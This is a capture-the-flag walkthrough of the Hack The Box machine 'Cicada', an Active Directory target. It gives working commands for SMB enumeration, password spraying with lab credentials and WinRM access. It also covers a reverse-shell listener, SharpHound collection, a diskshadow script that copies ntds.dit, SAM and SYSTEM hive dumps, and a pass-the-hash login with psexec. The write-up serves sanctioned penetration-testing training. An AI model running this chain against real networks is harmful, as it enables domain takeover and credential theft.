---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Cicada?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Cicada-1791134693057.webp)

---

# Walkthrough




Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```

┌─[bl1nk㉿kali]─[~/engagements/cicada/nmap]─[󰦝 10.10.15.226]─[ 10.129.231.149]
└─❯ nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt 53,88,135,139,389,445,464,593,636,3268,3269,5985,65274
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 19:28 +0200
Failed to resolve "53,88,135,139,389,445,464,593,636,3268,3269,5985,65274".
Nmap scan report for 10.129.231.149
Host is up (0.025s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 00:28:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-05T00:30:15+00:00; +6h59m59s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-05T00:29:36
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
```


I found the domain name with `netexec` and added it to `/etc/hosts`.

![](../../0.%20Assets/Cicada-1791135134193.webp)

I tried both anonymous and guest access to the shares, and `guest` worked.

![](../../0.%20Assets/Cicada-1791135230178.webp)

Now I'll spider with `netexec` to pull down every file we can reach.
```
netexec smb $T -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

![](../../0.%20Assets/Cicada-1791135703386.webp)

We find an interesting file.

![](../../0.%20Assets/Cicada-1791135731601.webp)

I'll look through the share we can open, and in the meantime try to `rid-brute` the users.

```
nxc smb $T -u 'guest' -p '' --rid-brute
```

![](../../0.%20Assets/Cicada-1791135477286.webp)

That paid off nicely. Let's clean up the output.

```
nxc smb $T -u 'guest' -p '' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```


![](../../0.%20Assets/Cicada-1791135528747.webp)

Now we have a default password and a list of users, which means we can password spray.

```
netexec smb $T -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb --continue-on-success
```


![](../../0.%20Assets/Cicada-1791135859171.webp)

I created a file to keep track of every credential we find.

![](../../0.%20Assets/Cicada-1791135965226.webp)

Let's see what these credentials get us.

I used a tool called [nxcspray](https://github.com/NTHSec/nxcspray) to try every protocol, with no luck. Let's run one more check against the SMB shares before we start attacking `ad authentication`.

![](../../0.%20Assets/Cicada-1791136185062.webp)

```
netexec smb $T -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

![](../../0.%20Assets/Cicada-1791136303124.webp)

A new share shows up, `DEV`, so let's see what it holds.

![](../../0.%20Assets/Cicada-1791136663741.webp)


There's not much we can do here, so let's move on to attacking AD.

I tried `AS-REP` roasting with no luck.

![](../../0.%20Assets/Cicada-1791136999505.webp)

`kerberoasting` came up empty too, so I turned to `ldapdomaindump`.

```
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' $T
```

I opened a web server with Python.

```
python3 -m http.server 80
```

And in the description of one of the users, we find a credential.

![](../../0.%20Assets/Cicada-1791138108288.webp)

![](../../0.%20Assets/Cicada-1791138115427.webp)

Let's run through everything again with this user.

```
./nxcspray all $T -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

![](../../0.%20Assets/Cicada-1791138311761.webp)

The credentials are valid, so let's check `SMB` again.

![](../../0.%20Assets/Cicada-1791138413828.webp)

Now we have access to the `DEV` share.

Once inside, we find a script.

![](../../0.%20Assets/Cicada-1791138453802.webp)

Let's grab it and see what's inside.

![](../../0.%20Assets/Cicada-1791138504323.webp)

That's another user enumerated. Let's add it to the list, but before going further, I want to see if we can `AS-REP` roast or `kerberoast` with david.


![1220](../../0.%20Assets/Cicada-1791138650248.webp)

![](../../0.%20Assets/Cicada-1791138699741.webp)

Nothing there, so let's move on to `emily`.

![](../../0.%20Assets/Cicada-1791138790854.webp)

`WinRM` shows as pwned, which means we can log in.

```
evil-winrm -i $T -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](../../0.%20Assets/Cicada-1791138986680.webp)


To get a more stable session, I set up a reverse shell through `Penelope`.

```
penelope -O -p 1337 -a
```

![](../../0.%20Assets/Cicada-1791139401298.webp)

I transferred `sharphound` onto the machine.

![](../../0.%20Assets/Cicada-1791139656707.webp)

And ran the collection.

```
powershell -ep bypass                 # bypass execution policy   
. .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\emily.oscars.CICADA\Desktop" -OutputPrefix "corp_audit"
```

![](../../0.%20Assets/Cicada-1791140037764.webp)

The nice thing about `penelope` is that I can download straight from the machine without spinning up `smb` shares or anything like that.

![](../../0.%20Assets/Cicada-1791140170945.webp)

Now I'll start BloodHound with my setup and ingest the data.

![973](../../0.%20Assets/Cicada-1791140367616.webp)

Now we just wait.

Once it's ingested:

Right-click on `emily`, set her as `owned`, then switch to `cypher` and select "shortest paths to domain admins".


![569](../../0.%20Assets/Cicada-1791140616507.webp)


![1028](../../0.%20Assets/Cicada-1791140826578.webp)

We need to perform a `DCSync` attack. For that I'll use impacket's `secretsdump`, and `bloodhound` even tells us how to run it.

![](../../0.%20Assets/Cicada-1791141067251.webp)

I ran into some trouble with the attack.

![](../../0.%20Assets/Cicada-1791142400377.webp)

So I fell back to a more conventional privilege escalation.

I uploaded `powerUp`, ran all the checks, and found something interesting.

![](../../0.%20Assets/Cicada-1791142492464.webp)

This user is part of the Backup Operators group, which gives it the privileges to copy sensitive files like the `SAM` and the `NTDS`.

Move to a directory we can write to.

```
cd C:\Windows\TEMP
```

On Kali, create the `viper.dsh` file.

```
touch viper.dsh  
  
nano viper.dsh  
  
#copy this inside  
  
set context persistent nowriters  
add volume c: alias viper  
create  
expose %viper% x:
```

Then convert it to Windows line endings.

```
unix2dos viper.dsh
```

Upload it to the Windows host.

![](../../0.%20Assets/Cicada-1791143757246.webp)

then

```
diskshadow /s viper.dsh  
  
#If successfull  
  
robocopy /b x:\windows\ntds . ntds.dit
```

![](../../0.%20Assets/Cicada-1791143778027.webp)

We now have the `ntds.dit` file.
Next, let's grab `SYSTEM` and `SAM` so we have every hash in the domain.

```
reg save hklm\system c:\windows\tasks\system

reg save hklm\sam c:\windows\tasks\sam
```

Pull those files back to Kali and extract the hashes with `secretsdump`.

```
impacket-secretsdump -ntds ntds.dit -system system -sam sam local | tee dump.txt
```

![](../../0.%20Assets/Cicada-1791143831395.webp)

With the administrator's NTLM hash, we can `Pass-The-Hash` through `PsExec`.

```
impacket-psexec cicada.htb/administrator@$T -hashes :2b87e7c93a3....
```


![](../../0.%20Assets/Cicada-1791143419955.webp)

And that's the machine done.